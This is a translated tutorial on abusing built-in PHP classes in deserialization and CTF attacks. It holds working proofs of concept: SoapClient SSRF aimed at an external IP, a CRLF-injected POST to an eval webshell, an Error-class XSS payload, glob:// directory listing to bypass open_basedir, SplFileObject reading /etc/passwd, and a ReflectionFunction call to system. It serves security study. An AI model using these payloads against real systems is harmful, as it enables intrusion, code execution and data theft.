# PHP safe learning—native class

Author: H3rmesk1t

# Pre-knowledge
> When there are deserialization points in the code but no available classes are found, you can consider using some native classes in `PHP`, but it should be noted that since `zend_class_unserialize_deny` is used in `PHP` to prohibit deserialization of some classes, some classes may not be able to be deserialized.

> Generally, when you see the following code statements, you can consider using the `PHP` native class for construction when you cannot find the method in the code.

```php
echo new $class($func);
```

> The code goes through PHP's built-in classes, and you can also refer to [`PHP Standard Library (SPL)`](https://www.php.net/manual/zh/book.spl.php)

```php
<?php
$classes = get_declared_classes();
foreach ($classes as $class) {
    $methods = get_class_methods($class);
    foreach ($methods as $method) {
        if (in_array($method, array(
            '__destruct',
            '__toString',
            '__wakeup',
            '__call',
            '__callStatic',
            '__get',
            '__set',
            '__isset',
            '__unset',
            '__invoke',
            '__set_state'
        ))) {
            print $class . '::' . $method . "\n";
        }
    }
}
?>
```
```php
Exception::__wakeup
Exception::__toString
ErrorException::__wakeup
ErrorException::__toString
Error::__wakeup
Error::__toString
CompileError::__wakeup
CompileError::__toString
ParseError::__wakeup
ParseError::__toString
TypeError::__wakeup
TypeError::__toString
ArgumentCountError::__wakeup
ArgumentCountError::__toString
ArithmeticError::__wakeup
ArithmeticError::__toString
DivisionByZeroError::__wakeup
DivisionByZeroError::__toString
Generator::__wakeup
ClosedGeneratorException::__wakeup
ClosedGeneratorException::__toString
DateTime::__wakeup
DateTime::__set_state
DateTimeImmutable::__wakeup
DateTimeImmutable::__set_state
DateTimeZone::__wakeup
DateTimeZone::__set_state
DateInterval::__wakeup
DateInterval::__set_state
DatePeriod::__wakeup
DatePeriod::__set_state
JsonException::__wakeup
JsonException::__toString
LogicException::__wakeup
LogicException::__toString
BadFunctionCallException::__wakeup
BadFunctionCallException::__toString
BadMethodCallException::__wakeup
BadMethodCallException::__toString
DomainException::__wakeup
DomainException::__toString
InvalidArgumentException::__wakeup
InvalidArgumentException::__toString
LengthException::__wakeup
LengthException::__toString
OutOfRangeException::__wakeup
OutOfRangeException::__toString
RuntimeException::__wakeup
RuntimeException::__toString
OutOfBoundsException::__wakeup
OutOfBoundsException::__toString
OverflowException::__wakeup
OverflowException::__toString
RangeException::__wakeup
RangeException::__toString
UnderflowException::__wakeup
UnderflowException::__toString
UnexpectedValueException::__wakeup
UnexpectedValueException::__toString
CachingIterator::__toString
RecursiveCachingIterator::__toString
SplFileInfo::__toString
DirectoryIterator::__toString
FilesystemIterator::__toString
RecursiveDirectoryIterator::__toString
GlobIterator::__toString
SplFileObject::__toString
SplTempFileObject::__toString
SplFixedArray::__wakeup
ReflectionException::__wakeup
ReflectionException::__toString
ReflectionFunctionAbstract::__toString
ReflectionFunction::__toString
ReflectionParameter::__toString
ReflectionType::__toString
ReflectionNamedType::__toString
ReflectionMethod::__toString
ReflectionClass::__toString
ReflectionObject::__toString
ReflectionProperty::__toString
ReflectionClassConstant::__toString
ReflectionExtension::__toString
ReflectionZendExtension::__toString
AssertionError::__wakeup
AssertionError::__toString
DOMException::__wakeup
DOMException::__toString
PDOException::__wakeup
PDOException::__toString
PDO::__wakeup
PDOStatement::__wakeup
SimpleXMLElement::__toString
SimpleXMLIterator::__toString
MongoDB\BSON\Binary::__set_state
MongoDB\BSON\Binary::__toString
MongoDB\BSON\DBPointer::__toString
MongoDB\BSON\Decimal128::__set_state
MongoDB\BSON\Decimal128::__toString
MongoDB\BSON\Int64::__toString
MongoDB\BSON\Javascript::__set_state
MongoDB\BSON\Javascript::__toString
MongoDB\BSON\MaxKey::__set_state
MongoDB\BSON\MinKey::__set_state
MongoDB\BSON\ObjectId::__set_state
MongoDB\BSON\ObjectId::__toString
MongoDB\BSON\Regex::__set_state
MongoDB\BSON\Regex::__toString
MongoDB\BSON\Symbol::__toString
MongoDB\
BSON\Timestamp::__set_state
MongoDB\BSON\Timestamp::__toString
MongoDB\BSON\Undefined::__toString
MongoDB\BSON\UTCDateTime::__set_state
MongoDB\BSON\UTCDateTime::__toString
MongoDB\Driver\BulkWrite::__wakeup
MongoDB\Driver\ClientEncryption::__wakeup
MongoDB\Driver\Command::__wakeup
MongoDB\Driver\Cursor::__wakeup
MongoDB\Driver\CursorId::__toString
MongoDB\Driver\CursorId::__wakeup
MongoDB\Driver\Manager::__wakeup
MongoDB\Driver\Query::__wakeup
MongoDB\Driver\ReadConcern::__set_state
MongoDB\Driver\ReadPreference::__set_state
MongoDB\Driver\Server::__wakeup
MongoDB\Driver\Session::__wakeup
MongoDB\Driver\WriteConcern::__set_state
MongoDB\Driver\WriteConcernError::__wakeup
MongoDB\Driver\WriteError::__wakeup
MongoDB\Driver\WriteResult::__wakeup
MongoDB\Driver\Exception\RuntimeException::__wakeup
MongoDB\Driver\Exception\RuntimeException::__toString
MongoDB\Driver\Exception\ServerException::__wakeup
MongoDB\Driver\Exception\ServerException::__toString
MongoDB\Driver\Exception\ConnectionException::__wakeup
MongoDB\Driver\Exception\ConnectionException::__toString
MongoDB\Driver\Exception\WriteException::__wakeup
MongoDB\Driver\Exception\WriteException::__toString
MongoDB\Driver\Exception\AuthenticationException::__wakeup
MongoDB\Driver\Exception\AuthenticationException::__toString
MongoDB\Driver\Exception\BulkWriteException::__wakeup
MongoDB\Driver\Exception\BulkWriteException::__toString
MongoDB\Driver\Exception\CommandException::__wakeup
MongoDB\Driver\Exception\CommandException::__toString
MongoDB\Driver\Exception\ConnectionTimeoutException::__wakeup
MongoDB\Driver\Exception\ConnectionTimeoutException::__toString
MongoDB\Driver\Exception\EncryptionException::__wakeup
MongoDB\Driver\Exception\EncryptionException::__toString
MongoDB\Driver\Exception\ExecutionTimeoutException::__wakeup
MongoDB\Driver\Exception\ExecutionTimeoutException::__toString
MongoDB\Driver\Exception\InvalidArgumentException::__wakeup
MongoDB\Driver\Exception\InvalidArgumentException::__toString
MongoDB\Driver\Exception\LogicException::__wakeup
MongoDB\Driver\Exception\LogicException::__toString
MongoDB\Driver\Exception\SSLConnectionException::__wakeup
MongoDB\Driver\Exception\SSLConnectionException::__toString
MongoDB\Driver\Exception\UnexpectedValueException::__wakeup
MongoDB\Driver\Exception\UnexpectedValueException::__toString
MongoDB\Driver\Monitoring\CommandFailedEvent::__wakeup
MongoDB\Driver\Monitoring\CommandStartedEvent::__wakeup
MongoDB\Driver\Monitoring\CommandSucceededEvent::__wakeup
CURLFile::__wakeup
mysqli_sql_exception::__wakeup
mysqli_sql_exception::__toString
PharException::__wakeup
PharException::__toString
Phar::__destruct
Phar::__toString
PharData::__destruct
PharData::__toString
PharFileInfo::__destruct
PharFileInfo::__toString
```

# Common PHP native class utilization analysis
## SoapClient Class

<img src="./images/1.png" alt="">

> `SoapClient::__call`: Since it can send `HTTP` and `HTTPS` requests when the `__call` method is triggered, it can perform `SSRF` utilization

```php
public SoapClient::SoapClient(mixed $wsdl [, array $options ])

[1] The first parameter is used to indicate whether it is WSDL mode. Setting this value to null means non-WSDL mode
[2] The second parameter is an array. If it is in WSDL mode, this parameter is optional; if it is in non-WSDL mode, the location and uri options must be set, where location is the URL of the SOAP server to which the request is sent, and uri is the target namespace of the SOAP service. The second parameter allows setting the user_agent option to set the user-agent header of the request
```
```php
SoapClient::__call ( string $name , array $args ) : mixed
```

> Prerequisites for utilization
```
[1] Soap extension is required and needs to be enabled manually
[2] Need to call a non-existent method to trigger its __call() function
[3] Only http/https protocol
```

> In the `PHP-manual` type of `SOAP` is: `The SOAP extension can be used to write SOAP Servers and Clients. It supports subsets of » SOAP 1.1, » SOAP 1.2 and » WSDL 1.1 specifications.`. In fact, simply put, `SOAP` is a simple XML-based protocol that allows applications to exchange information through `HTTP`

> For example, the following code uses Tencent's open ordinary `soap` call to check whether the QQ number is online

```php
<?php
$url = "http://www.webxml.com.cn/webservices/qqOnlineWebService.asmx?wsdl";
$client = new SoapClient($url);

$params = array(
    "qqCode"=> "1448404788"
);
$result = $client->qqCheckOnline($params);
print_r($result);
?>

stdClass Object
(
    [qqCheckOnlineResult] => Y
)
```
### SSRF using the SoapClient class

> Test code:
```php
<?php
ini_set('soap.wsdl_cache_enabled',0);
ini_set('
soap.wsdl_cache_ttl',0);
$url = 'http://185.194.148.106:8888/';
$demo = new SoapClient(null,array('location'=>$url, 'uri'=>$url));
$test = unserialize(serialize($demo));
$test->H3rmesk1t(); // Call a method that does not exist in the object at will, triggering the __call method to perform ssrf
?>
```
<img src="./images/2.png" alt="">


> Under normal circumstances, the SoapClient class calls a non-existent function and calls the `__call() method and issues a request. The user_agent of the request package issued by SoapClient is completely controllable. Combined with `CRLF injection, a fully controllable POST request can be constructed, because the most critical `Content-Length` and `Content-Type` of the `user_agent` of the `GET request` is much simpler. You only need to construct the `location`. It should be noted that `SoapClient` will only issue a request without receiving a response.

> Test code:
```php
[+] shell.php
<?php
    if($_SERVER['REMOTE_ADDR'] == '127.0.0.1') {
        @eval($_REQUEST['cmd']);
    }
?>

[+] index.php
<?php
    $demo = unserialize($_GET['h3rmesk1t']);
    $demo->d1no();
?>

[+] exp.php
<?php
    $target = 'http://127.0.0.1/Demo/shell.php';
    $post_string = 'cmd=file_put_contents("C:/Tools/phpstudy_pro/WWW/Demo/info.php", "<?php phpinfo();?>");';
    $headers = array(
        'X-Forwarded-For: 127.0.0.1',
        'Cookie: aaaa=ssss'
    );
    $user_agent = 'aaa^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^^'.$post_string;
    $options = array(
        'location' => $target,
        'user_agent'=> $user_agent,
        'uri'=> "aaab"
    );

    $b = new SoapClient(null, $options);

    $aaa = serialize($b);
    $aaa = str_replace('^^', '%0d%0a', $aaa);
    $aaa = str_replace('&', '%26', $aaa);
    echo $aaa;
?>
```

## Error/Exception Built-in class
###XSS using the Error/Exception built-in class
> The Error class is a built-in class of `PHP`, which is used to automatically customize an Error. In the `php7` environment, it may cause an `xss` vulnerability because it has a built-in `__toString()` method, which is often used in PHP deserialization.
> The `Exception` class is similar to the `Error` class

> Usage situation

```php
Error Built-in class:
    Applicable to php7 version
    When an error is turned on

Exception Built-in class:
    Suitable for php5 and 7 versions
    When an error is turned on
```

> The test code is as follows:

```php
<?php
    $demo = unserialize($_GET['cmd']);
    echo $demo;
?>
```
> `POC` code

```php
<?php
$demo = new Error("<script>alert('h3rmesk1t')</script>");
echo urlencode(serialize($demo));
?>
```
<img src="./images/3.png" alt="">

### Use Error/Exception to bypass hash comparison
> The two `Error` and `Exception` are built-in classes of `PHP`, which are not limited to `XSS`, but can also bypass the comparison of `md5()` function and `sha1()` function through clever construction.

#### Error Class
> Error` is the base class of all `PHP` internal error classes, which were introduced in `PHP7.0.0`

<img src="./images/4.png" alt="">

```php
Class properties:
    message: Error message content
    code: Error code
    file: throws the error file name
    line: Number of lines thrown in the file

Class Method:
    Error::__construct — Initialize the error object
    Error::getMessage — Get error message
    Error::getPrevious — Return to the previous Throwable
    Error::getCode — Get error code
    Error::getFile — Get the file when the error occurred
    Error::getLine — Get the line number when the error occurred
    Error::getTrace — Get the call stack (stack trace)
    Error::getTraceAsString — Get a call stack (stack trace) in the form of a string
    Error::__toString — String expression of error
    Error::__clone — cloning error
```
#### Exception class
> `Exception` is the base class for all exceptions, which was introduced in `PHP5.0.0`

<img src="./images/5.png" alt="">

```php
Class properties:
    message: Exception message content
    code: exception code
    file: file name that throws exception
    line: The line number of the exception thrown in the file
Class Method:
    Exception::__construct — Exception constructor
    Exception::getMessage — Get exception message content
    Exception::getPrevious — Returns the previous exception in the exception chain
    Exception::getCode — Get exception code
    Exception::getFile — The name of the program file when the exception is created
    Exception::getLine — Get the line number in the file where the created exception is located
    Exception::getTrace — Get exception tracking information
    Exception::getTraceAsString — Get exception tracking information for string type
    Exception::__toString — Convert exception object to string
    Exception::__clone — Exception clone
```
> You can see that in the Error and Exception, there is only the `__toString` method in the two `PHP native classes`, which is used to convert exception or error objects into strings.

> Take Error as an example to see what happens when the `__toString()` method is triggered

<img src="./images/6.png" alt="">

> Found that this will output the current error in the form of a string, and contain the current error message `("h3rmesk1t")` and the current error line number `("2")`, while the error code `"1"` passed in Error("payload",1)` will not be output

> Let's take a look at another situation

<img src="./images/7.png" alt="">

> You can find that the two error objects `$demo1` and `$demo2` are different themselves, but the result returned by the `__toString()` method is the same. The reason why it is needed here is because the data returned by `__toString()` contains the current line number

> The `Exception` class is used and resulted in exactly the same as the Error class, except that the `Exception` class is suitable for `PHP5` and `PHP7`, while the `Error` class is only suitable for `PHP7`

## SimpleXMLElement Class
> The definition of the constructor `SimpleXMLElement::__construct` in the `SimpleXMLElement` class is as follows

<img src="./images/8.png" alt="">

<img src="./images/9.png" alt="">

###XXE using the SimpleXMLElement class
> You can see that by setting the third parameter `data_is_url` to `true`, you can load the remote `xml file` and the second parameter
Just set the constant value to `2`. The first parameter `data` is the url address of the `payload` set by yourself, that is, the `url` of the external entity introduced. In this way, you can control the class called by the target, and you can construct `XXE` through the built-in class `SimpleXMLElement`.

## ZipArchive Class
> The `ZipArchive` class is a native class of `PHP`. It was introduced after `PHP5.20`. The `ZipArchive` class can compress and decompress files.

```php
class ZipArchive implements Countable {
/* Properties */
int $lastId;
int $status;
int $statusSys;
int $numFiles;
string $filename;
string $comment;
/* Methods */
public addEmptyDir(string $dirname, int $flags = 0): bool
public addFile(
    string $filepath,
    string $entryname = "",
    int $start = 0,
    int $length = 0,
    int $flags = ZipArchive::FL_OVERWRITE
): bool
public addFromString(string $name, string $content, int $flags = ZipArchive::FL_OVERWRITE): bool
public addGlob(string $pattern, int $flags = 0, array $options = []): array|false
public addPattern(string $pattern, string $path = ".", array $options = []): array|false
public clearError(): void
public close(): bool
public count(): int
public deleteIndex(int ​​$index): bool
public deleteName(string $name): bool
public extractTo(string $pathto, array|string|null $files = null): bool
public getArchiveComment(int $flags = 0): string|false
public getCommentIndex(int ​​$index, int $flags = 0): string|false
public getCommentName(string $name, int $flags = 0): string|false
public GetExternalAttributesIndex(
    int $index,
    int &$opsys,
    int &$attr,
    int $flags = ?
): bool
public getExternalAttributesName(
    string $name,
    int &$opsys,
    int &$attr,
    int $flags = 0
): bool
public getFromIndex(int ​​$index, int $len = 0, int $flags = 0): string|false
public getFromName(string $name, int $len = 0, int $flags = 0): string|false
public getNameIndex(int ​​$index, int $flags = 0): string|false
public getStatusString(): string
public getStream(string $name): resource|false
public getStreamIndex(int ​​$index, int $flags = 0): resource|false
public getStreamName(string $name, int $flags = 0): resource|false
public static isCompressionMethodSupported(int $method, bool $enc = true): bool
public static isEncryptionMethodSupported(int $method, bool $enc = true): bool
public locationName(string $name, int $flags = 0): int|false
public open(string $filename, int $flags = 0): bool|int
public registerCancelCallback(callable $callback): bool
public registerProgressCallback(float $rate, callable $callback): bool
public renameIndex(int ​​$index, string $new_name): bool
public renameName(string $name, string $new_name): bool
public replaceFile(
    string $filepath,
    string $index,
    int $start = 0,
    int $length = 0,
    int $flags = 0
): bool
public setArchiveComment(string $comment): bool
public setCommentIndex(int ​​$index, string $comment): bool
public setCommentName(string $name, string $comment): bool
public setCompressionIndex(int ​​$index, int $method, int $compflags = 0): bool
public setCompressionName(string $name, int $method, int $compflags = 0): bool
public setEncryptionIndex(int ​​$index, int $method, ?string $password = null): bool
public setEncryptionName(string $name, int $method, ?string $password = null): bool
public setExternalAttributesIndex(
    int $index,
    int $opsys,
    int $attr,
    int $flags = 0
): bool
public setExternalAttributesName(
    string $name,
    int $opsys,
    int $attr,
    int $flags = 0
): bool
public setMtimeIndex(int ​​$index, int $timestamp, int $flags = 0): bool
public setMtimeName(string $name, int $timestamp, int $flags = 0): bool
public setPassword(string $password): bool
public statIndex(int ​​$index, int $flags = 0): array|false
public statName(string $name, int $flags = 0): array|false
public unchangeAll(): bool
public unchangeArchive(): bool
public unchangeIndex(int ​​$index): bool
public unchangeName(string $name): bool
}
```
> Common class methods

```php
ZipArchive::addEmptyDir: Add a new file directory
ZipArchive::addFile: Add file to the specified zip compressed package
ZipArchive::addFromString: Add new file and add contents to it
ZipArchive::close: Close ziparchive
ZipArchive::extractTo: Decompress the compressed package
ZipArchive::open: Open a zip compressed package
ZipArchive::deleteIndex: Delete a file in the compressed package, such as: deleteIndex(0) means to delete the first file
ZipArch
ive::deleteName: Delete a file name in the compressed package, and also delete the file
```
> Focus on the `ZipArchive::open` method, which is used to open a new or existing `zip archive` for reading, writing, or modifying

```php
ZipArchive::open(string $filename, int $flags=0)
```
```php
filename: The file name of the ZIP archive to be opened.
flags: The mode used to open the file. There are several modes:
    ZipArchive::OVERWRITE: Always start with a new compressed package, which will be overwritten or deleted if it already exists.
    ZipArchive::CREATE: Create a zip compressed package if it does not exist
    ZipArchive::RDONLY: Open the compressed package with read-only mode
    ZipArchive::EXCL: An error occurred if the compressed package already exists
    ZipArchive::CHECKCONS: performs an additional consistency check on the compressed package, displays an error if it fails
```
> If the value of the `flags` parameter is set to `ZipArchive::OVERWRITE`, you can delete the specified file. Here you can follow up the method to see `const OVERWRITE = 8`, that is, define `OVERWRITE` as a constant `8`. You can also directly assign `flags` to `8` when calling.

## PHP native file operation class
### You can traverse directory classes
#### DirectoryIterator Class
> The `DirectoryIterator` class provides a simple interface for viewing file system directory contents. The constructor of this class will create an iterator for the specified directory.

<img src="./images/10.png" alt="">

```php
<?php
$dir = new DirectoryIterator("/");
echo $dir;
?>
```
<img src="./images/11.png" alt="">

> Here you can use the `glob:// protocol (find matching file path pattern) to find the desired file path

<img src="./images/12.png" alt="">

> Here you can also traverse the `$dir` object to output all file names

```php
<?php
    highlight_file(__FILE__);
    $dir = new DirectoryIterator("/Tools/phpstudy_pro/WWW/Demo");
    foreach($dir as $file){
        echo($file.PHP_EOL);
    }
?>
```
<img src="./images/13.png" alt="">

#### FilesystemIterator class
> The `FilesystemIterator` class is the same as the `DirectoryIterator` class, providing a simple interface for viewing the content of the file system directory. The constructor of this class will create an iterator for a specified directory. The usage method of this class is basically the same as the `DirectoryIterator` class.

```php
class FilesystemIterator extends DirectoryIterator implements SeekableIterator {
/* Constants */
const int CURRENT_AS_PATHNAME = 32;
const int CURRENT_AS_FILEINFO = 0;
const int CURRENT_AS_SELF = 16;
const int CURRENT_MODE_MASK = 240;
const int KEY_AS_PATHNAME = 0;
const int KEY_AS_FILENAME = 256;
const int FOLLOW_SYMLINKS = 512;
const int KEY_MODE_MASK = 3840;
const int NEW_CURRENT_AND_KEY = 256;
const int SKIP_DOTS = 4096;
const int UNIX_PATHS = 8192;
/* Methods */
public __construct(string $directory, int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO | FilesystemIterator::SKIP_DOTS)
public current(): string|SplFileInfo|FilessystemIterator
public getFlags(): int
public key(): string
public next(): void
public rewind(): void
public setFlags(int $flags): void
/* Inherited methods */
public DirectoryIterator::current(): DirectoryIterator
public DirectoryIterator::getATime(): int
public DirectoryIterator::getBasename(string $suffix = ""): string
public DirectoryIterator::getCTime(): int
public DirectoryIterator::getExtension(): string
public DirectoryIterator::getFilename(): string
public DirectoryIterator::getGroup(): int
public DirectoryIterator::getInode(): int
public DirectoryIterator::getMTime(): int
public DirectoryIterator::getOwner(): int
public DirectoryIterator::getPath(): string
public DirectoryIterator::getPathname(): string
public DirectoryIterator::getPerms(): int
public DirectoryIterator::getSize(): int
public DirectoryIterator::getType(): string
public DirectoryIterator::isDir(): bool
public DirectoryIterator::isDot(): bool
public DirectoryIterator::isExecutable(): bool
public DirectoryIterator::isFile(): bool
public DirectoryIterator::isLink(): bool
public DirectoryIterator::isReadable(): bool
public DirectoryIterator::isWritable(): bool
public DirectoryIterator::key(): int|false
public DirectoryIterator::next(): void
public DirectoryIterator::rewind(): void
public DirectoryIterator::seek(int $offset): void
public DirectoryIterator::__toString(): string
public DirectoryIterator::valid(): bool
}
```
<img src="./images/14.png" alt="">

#### GlobIterator Class
> Similar to the functions of the first two classes, the `GlobIterator` class can also traverse a file directory, and its usage method is basically similar to the first two classes, but slightly different from the above is that its behavior is similar to `glob()`, and the file path can be found through pattern matching.

<img src="./images/15.png" alt="">

<img src="./images/16.png" alt="">

#### trick: Use the traversable directory class to bypass open_basedir
> Using the DirectoryIterator class

```php
<?php
$dir = $_GET['whoami'];
$a = new DirectoryIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');// It is also OK to not add __toString(), because echo can be called automatically
}
?>

# payload in the form of a sentence:
$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```

> Use the FilesystemIterator class
```php
<?php
$dir = $_GET['whoami'];
$a = new FilesystemIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');// It is also OK to not add __toString(), because echo can be called automatically
}
?>

# payload in the form of a sentence:
$a = new FilesystemIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```

> Using the GlobIterator class

```php
<?php
$dir = $_GET['whoami'];
$a = new GlobIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');// It is also OK to not add __toString(), because echo can be called automatically
}
?>

# payload in the form of a sentence:
$a = new FilesystemIterator("/*");foreach($a as $f){echo($f->__toString().'<br>');}
```

### Readable file class
> The currently discovered readable file class `SplFileObject` and `SplFileInfo` class provide a high-level object-oriented interface for information of a single file, which can be used to traverse, find, operate, etc. of file content.

```php
class SplFileObject extends SplFileInfo implements RecursiveIterator, SeekableIterator {
/* Constants */
const int DROP_NEW_LINE = 1;
const int READ_AHEAD = 2;
const int SKIP_EMPTY = 4;
const int READ_CSV = 8;
/* Methods */
public __construct(
    string $filename,
    string $mode = "r",
    bool $useIncludePath = false,
    ?resource $context = null
)
public current(): string|array|false
public eof(): bool
public fflush(): bool
public fgetc(): string|false
public fgetcsv(string $separator = ",", string $enclosure = "\"", string $escape = "\\"): array|false
public fgets(): string
public fgetss(string $allowable_tags = ?): string
public flock(int $operation, int &$ wouldBlock = null): bool
public fpassthru(): int
public fputcsv(
    array $fields,
    string $separator = ",",
    string $enclosure = "\"",
    string $escape = "\\",
    string $eol = "\n"
): int|false
public fread(int $length): string|false
public fscanf(string $format, mixed &...$vars): array|int|null
public fseek(int $offset, int $whence = SEEK_SET): int
public fstat(): array
public ftell(): int|false
public ftruncate(int $size): bool
public fwrite(string $data, int $length = 0): int|false
public getChildren(): ?RecursiveIterator
public getCsvControl(): array
public getFlags(): int
public getMaxLineLen(): int
public hasChildren(): bool
public key(): int
public next(): void
public rewind(): void
public seek(int $line): void
public setCsvControl(string $separator = ",", string $enclosure = "\"", string $escape = "\\"): void
public setFlags(int $flags): void
public setMaxLineLen(int $maxLength): void
public valid(): bool
/* Inherited methods */
public SplFileInfo::getATime(): int|false
public SplFileInfo::getBasename(string $suffix = ""): string
public SplFileInfo::getCTime(): int|false
public SplFileInfo::getExtension(): string
public SplFileInfo::getFileInfo(?string $class = null): SplFileInfo
public SplFileInfo::getFilename(): string
public SplFileInfo::getGroup(): int|false
public SplFileInfo::getInode(): int|false
public SplFileInfo::getLinkTarget(): string|false
public SplFileInfo::getMTime(): int|false
public SplFileInfo::getOwner(): int|false
public SplFileInfo::getPath(): string
public SplFileInfo::getPathInfo(?string $class = null): ?SplFileInfo
public SplFileInfo::getPathname(): string
public SplFileInfo::getPerms(): int|false
public SplFileInfo::getRealPath(): string|false
public SplFileInfo::getSize(): int|false
public SplFileInfo::getType(): string|false
public SplFileInfo::isDir(): bool
public SplFileInfo::isExecutable(): bool
public SplFileInfo::isFile(): bool
public SplFileInfo::isLink(): bool
public SplFileInfo::isReadable(): bool
public SplFileInfo::isWritable(): bool
public SplFileInfo::openFile(string $mode = "r", bool $useIncludePath = false, ?resource $context = null): SplFileObject
public SplFileInfo::setFileClass(string $class = SplFileObject::class): void
public SplFileInfo::setInfoClass(string $class = SplFileInfo::class): void
public SplFileInfo::__toString(): string
}
```

> Test code

```php
<?php
highlight_file(__FILE__);
$context = new SplFileObject('/Tools/phpstudy_pro/WWW/Demo/flag.txt');
echo $context;
?>

<?php
$context = new SplFileObject('/etc/passwd');
foreach($context as $f){
    echo($f);
}
?>
```

<img src="./images/17.png" alt="">

## Use the ReflectionMethod class to get relevant information about class methods
>
`ReflectionMethod` inherits the abstract class `ReflectionFunctionAbstract`, which implements the `Reflector` interface

```php
abstract class ReflectionFunctionAbstract implements Reflector {
/* Properties */
public $name;
/* Methods */
final private __clone(): void
public getAttributes(?string $name = null, int $flags = 0): array
public getClosureScopeClass(): ?ReflectionClass
public getClosureThis(): ?object
public getDocComment(): string|false
public getEndLine(): int|false
public getExtension(): ?ReflectionExtension
public getExtensionName(): string|false
public getFileName(): string|false
public getName(): string
public getNamespaceName(): string
public getNumberOfParameters(): int
public getNumberOfRequiredParameters(): int
public getParameters(): array
public getReturnType(): ?ReflectionType
public getShortName(): string
public getStartLine(): int|false
public getStaticVariables(): array
public hasReturnType(): bool
public inNamespace(): bool
public isClosure(): bool
public isDeprecated(): bool
public isGenerator(): bool
public isInternal(): bool
public isUserDefined(): bool
public isVariadic(): bool
public returnsReference(): bool
abstract public __toString(): void
}
```

> The `ReflectionMethod` class reports information about a method. It can extend the analysis of `PHP programs` in `PHP running state`, export or extract detailed information about classes, methods, properties, parameters, etc., including comments. This dynamically obtained information and the function of methods that dynamically call objects is called the `Reflection API`. There are many inherited methods in the `ReflectionMethod` class, such as the `getDocComment()` method, which can be used to obtain the annotation content of each function in the class.

```php
<?php
highlight_file(__FILE__);
class Demo {
    /**
     * H3rmesk1t
     * @return int
     */
    protected function h3() {
        return 1;
    }
}

$ref = new ReflectionMethod('Demo', 'h3');
var_dump($ref->getDocComment());
```
<img src="./images/18.png" alt="">

> At the same time, there is a `ReflectionFunction`, such as `[new ReflectionFunction('system'), invokeArgs](array('aaa.txt'=>'dir'));` executable function call